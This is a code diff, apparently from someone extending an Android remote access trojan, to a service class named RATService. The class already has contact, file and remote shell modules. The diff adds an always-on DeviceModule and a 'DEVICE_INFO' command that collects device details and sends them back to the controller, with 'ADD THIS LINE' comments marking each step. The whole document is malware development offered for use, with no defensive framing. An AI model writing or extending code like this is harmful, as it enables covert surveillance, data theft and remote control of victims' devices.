@@ -35,6 +35,7 @@ public class RATService extends Service {
     private ContactsModule contactsModule;
     private FileModule fileModule;
     private ShellModule shellModule;
+    private DeviceModule deviceModule;  // ← ADD THIS LINE
     
     @Override
     public void onCreate() {
@@ -51,6 +52,7 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
+        deviceModule = new DeviceModule(this);  // ← ADD THIS LINE (always initialize)
         
         startConnection();
     }
@@ -178,6 +180,14 @@ public class RATService extends Service {
                 if (shellModule != null) {
                     String result = shellModule.executeCommand(args);
                     sendCommand("SHELL|" + result);
+                }
+                break;
+                
+            // ← ADD THIS NEW CASE
+            case "DEVICE_INFO":
+                if (deviceModule != null) {
+                    String result = deviceModule.getDeviceInfo();
+                    sendCommand("DEVICE_INFO|" + result);
                 }
                 break;
                 
